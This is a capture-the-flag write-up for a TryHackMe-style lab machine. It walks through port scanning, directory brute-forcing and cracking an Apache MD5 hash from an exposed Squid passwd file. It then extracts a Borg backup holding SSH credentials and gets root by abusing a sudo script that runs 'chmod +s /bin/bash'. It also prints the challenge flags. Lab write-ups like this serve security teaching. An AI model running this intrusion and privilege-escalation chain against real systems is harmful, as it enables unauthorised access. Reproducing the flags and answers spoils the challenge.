---
custom_edit_url: null
pagination_next: null
pagination_prev: null
---

## Task 1: Deploy the machine
### Deploy the machine
### No answer needed

&nbsp;

## Task 2: Compromise the System
### Scan the machine, how many ports are open?
Let's perform an `nmap` scan on the IP address.
```
$ nmap -sC -sV 10.10.228.18
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-12 14:30 IST
Nmap scan report for 10.10.228.18
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.99 seconds
```
As we can see there are two open ports:

| Port | Service | 
| :-: | :-: |
| 22 | ssh |
| 80 | http |

### Answer
```
2
```

&nbsp;

### What service is running on port 22?
### Answer
```
SSH
```

&nbsp;

### What service is running on port 80?
### Answer
```
HTTTP
```

&nbsp;

### What is the user.txt flag?
Let's check the IP address through the browser.

![2](https://github.com/Knign/Write-ups/assets/110326359/8a85076a-7870-41e6-8abf-ec595aac7c4d)

Now that we know it is hosting a `apache2` server, we can brute force the directories using `gobuster`.
```
$ gobuster dir -u http://10.10.228.18 -w /usr/share/wordlists/dirb/small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.228.18
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================


/admin                (Status: 301) [Size: 312] [--> http://10.10.228.18/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.228.18/etc/]
Progress: 959 / 960 (99.90%)
===============================================================
Finished
===============================================================
```
Let's go to the `admmin` directory and see what we can find.

![3](https://github.com/Knign/Write-ups/assets/110326359/3870ef97-743d-4637-8af3-9378a7202e0f)

Let's go to the `Admin` page.

![4](https://github.com/Knign/Write-ups/assets/110326359/af7be9ad-a52a-4550-a901-fd6ded193313)

From what Alex said in his final message, we know that he has probably set up a squid proxy.

Before we look for it's directory let's see what `Archive` has.

![5](https://github.com/Knign/Write-ups/assets/110326359/ded7ca6c-d3f7-488f-b6fe-8770af0e5cc6)

Let's click on `Download`.
```
$ ls
archive.tar
```
We can extract his archive using the `tar` utility.
```
$ tar -xvf archive.tar 
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```
After extracting the archive, if we go to `home/field/dev/final_archive` and cat the `README` file present there we get the following information.
```
$ cat README 
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```
#### BORG backup
BORG is a  duplication program used to securely and efficiently backup data.
It can also be used to backup entire filesystems which can then be mounted onto other filesystems for easier examination.

Having read the messages between the two admin, we can guess that this is a probably a backup of Alex's filesystem.
However, before we do that, let's first check out the `etc` directory as well.

![7](https://github.com/Knign/Write-ups/assets/110326359/6f6994a4-1639-4bad-a156-e7db0dda3047)

Ah! So this is where the `squid` directory for the Squid proxy was located. Let's go inside.

![8](https://github.com/Knign/Write-ups/assets/110326359/0e07adff-6dad-4b9a-94ad-0448df5ab556)

The `passwd` file probably has some useful information.

![9](https://github.com/Knign/Write-ups/assets/110326359/2c6ee7a6-5087-44eb-9043-84a992071be5)

We have what looks to be a pair of a username `music_archive` and a hashed password `$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`.

| Username | Password hash |
| :-: | :-: |
| music_archive | $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. |

Let's identify the hash using the `hash-identifier` utility.
```
$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Possible Hashs:
[+] MD5(APR)
```
Before we crack the hash let's save the hash in a `hash.txt` file and take a look at the hash-mode for MD5(APR).

![10](https://github.com/Knign/Write-ups/assets/110326359/2974bd92-6ea7-4246-8aec-2e07e064a859)

Now we can use `hashcat` to crack the hash.
```
$ hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt                          
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 1587/3239 MB (512 MB allocatable), 3MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1600 (Apache $apr1$ MD5, md5apr1, MD5 (APR))
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Sun Nov 12 15:16:11 2023 (3 secs)
Time.Estimated...: Sun Nov 12 15:16:14 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    12073 H/s (144115188076.33ms) @ Accel:256 Loops:15 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 39168/14344385 (0.27%)
Rejected.........: 0/39168 (0.00%)
Restore.Point....: 38400/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:990-1000
Candidate.Engine.: Device Generator
Candidates.#1....: jonah1 -> lynnlynn
Hardware.Mon.#1..: Util: 68%

Started: Sun Nov 12 15:15:28 2023
Stopped: Sun Nov 12 15:16:16 2023
```
Now we know both the username and the password.

| Username | Password |
|-|-|
| music_archive | squidward |

We are all set to extract the Alex's filesystem. We can use the `borg` utility to do this.
```
$ borg extract /home/kunal/tryhackme/cyborg/home/field/dev/final_archive::music_archive
Enter passphrase for key /home/kunal/tryhackme/cyborg/home/field/dev/final_archive: 
```
If we then go to the `home/alex/Documents` directory, we see a `note.txt` file. 

Let's `cat` out the file.
```
$ cat note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```
Let's try to `ssh` into the machine using the above credentials.
```
$ ssh alex@10.10.228.18      
The authenticity of host '10.10.228.18 (10.10.228.18)' can't be established.
ED25519 key fingerprint is SHA256:hJwt8CvQHRU+h3WUZda+Xuvsp1/od2FFuBvZJJvdSHs.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.228.18' (ED25519) to the list of known hosts.
alex@10.10.228.18's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ 
```
We have successfully logged on to Alex's machine.

Let's look around to see what we can find.
```
$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
```
The `user.txt` file seems interesting. Let's check it's contents.
```
$ cat user.txt 
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```
### Answer
```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

&nbsp;

### What is the root.txt flag?
In order to find the root flag we need to become the `root` user.

Using the `sudo` command we can see what files we can execute 
```
$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

```
We can see the `/etc/mp3backups/backup.sh` script can be executed by any user, including us.
```bash title="backup.sh"
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```
Looking inside the `while` look, we can see that the program takes in user command identified by `-c`, and executes it.

Using this knowledge, we can set the `suid` bit on the `/bin/bash` file.
```
$ sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```
Now on executing the `bash` command, we will get root privilege.

Let's check our effective ID.
```
bash-4.3# id
uid=1000(alex) gid=1000(alex) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(alex)
```
We can now go the `/root` directory.
```
bash-4.3# cd /root
bash-4.3# ls
root.txt
```
Let's `cat` the flag.
```
bash-4.3# cat root.txt 
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
### Answer
```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
